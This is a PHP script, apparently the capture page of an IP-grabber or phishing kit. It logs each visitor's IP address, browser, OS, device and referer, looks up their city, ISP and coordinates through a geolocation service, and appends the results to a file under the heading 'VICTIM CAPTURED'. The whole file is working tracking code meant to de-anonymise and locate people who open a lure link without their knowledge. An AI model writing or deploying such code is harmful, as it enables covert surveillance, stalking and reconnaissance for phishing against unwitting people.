<?php
if(isset($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddr = $_SERVER['HTTP_CLIENT_IP'];
} elseif(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddr = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipaddr = $_SERVER['REMOTE_ADDR'];
}

if(strpos($ipaddr,',') !== false) {
    $ipaddr = preg_split("/\,/", $ipaddr)[0];
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct';

function getDeviceType($ua) {
    if(preg_match('/(android|webos|iphone|ipad|ipod|blackberry)/i', $ua)) return "Mobile";
    if(preg_match('/(tablet|ipad)/i', $ua)) return "Tablet";
    return "Desktop";
}

function getBrowser($ua) {
    if(preg_match('/Firefox/i', $ua)) return "Firefox";
    if(preg_match('/Chrome/i', $ua)) return "Chrome";
    if(preg_match('/Safari/i', $ua)) return "Safari";
    if(preg_match('/Edge/i', $ua)) return "Edge";
    return "Unknown";
}

function getOS($ua) {
    if(preg_match('/windows nt 10/i', $ua)) return "Windows 10/11";
    if(preg_match('/windows nt 6.3/i', $ua)) return "Windows 8.1";
    if(preg_match('/windows nt 6.2/i', $ua)) return "Windows 8";
    if(preg_match('/windows nt 6.1/i', $ua)) return "Windows 7";
    if(preg_match('/windows/i', $ua)) return "Windows";
    if(preg_match('/mac os x 1[0-9]_[0-9]+/i', $ua)) {
        preg_match('/mac os x (1[0-9]_[0-9]+)/i', $ua, $matches);
        return "MacOS " . str_replace('_', '.', $matches[1]);
    }
    if(preg_match('/mac os x/i', $ua)) return "MacOS";
    if(preg_match('/android ([0-9.]+)/i', $ua, $matches)) return "Android " . $matches[1];
    if(preg_match('/android/i', $ua)) return "Android";
    if(preg_match('/iphone os ([0-9_]+)/i', $ua, $matches)) return "iOS " . str_replace('_', '.', $matches[1]);
    if(preg_match('/ipad; cpu os ([0-9_]+)/i', $ua, $matches)) return "iPadOS " . str_replace('_', '.', $matches[1]);
    if(preg_match('/iphone|ipad/i', $ua)) return "iOS";
    return "Linux";
}

$device = getDeviceType($user_agent);
$browser = getBrowser($user_agent);
$os = getOS($user_agent);

// Geolocalización con más campos
$geo_data = @file_get_contents("http://ip-api.com/json/{$ipaddr}?fields=country,countryCode,region,regionName,city,zip,isp,org,lat,lon,timezone");
$geo = json_decode($geo_data, true);

$log = "\n╔═══════════════════════════════════════════════════╗\n";
$log .= "║  🎯 VICTIM CAPTURED - " . $timestamp . "  ║\n";
$log .= "╚═══════════════════════════════════════════════════╝\n";
$log .= "🌐 IP Address : " . $ipaddr . "\n";

if($geo && isset($geo['country'])) {
    $log .= "🌍 Location   : " . $geo['city'] . ", " . $geo['regionName'] . ", " . $geo['country'] . " (" . $geo['countryCode'] . ")\n";
    $log .= "🏢 ISP        : " . $geo['isp'] . "\n";
    if(isset($geo['org']) && $geo['org'] != $geo['isp']) {
        $log .= "🏛️  Organization: " . $geo['org'] . "\n";
    }
    $log .= "📍 Coordinates: " . $geo['lat'] . ", " . $geo['lon'] . "\n";
    $log .= "🕐 Timezone   : " . $geo['timezone'] . "\n";
} else {
    $log .= "⚠️  Geolocation: Not available (local/private IP)\n";
}

$log .= "💻 Device     : " . $device . "\n";
$log .= "🖥️  OS         : " . $os . "\n";
$log .= "🌐 Browser    : " . $browser . "\n";
$log .= "🔗 Referer    : " . $referer . "\n";
$log .= "📱 User-Agent : " . $user_agent . "\n";
$log .= str_repeat("─", 52) . "\n";

file_put_contents('ip.txt', $log, FILE_APPEND);

// Respuesta JSON (para uso futuro con AJAX)
header('Content-Type: application/json');
echo json_encode([
    'status' => 'success',
    'ip' => $ipaddr,
    'location' => isset($geo['city']) ? $geo['city'] . ', ' . $geo['country'] : 'Unknown'
]);
?>
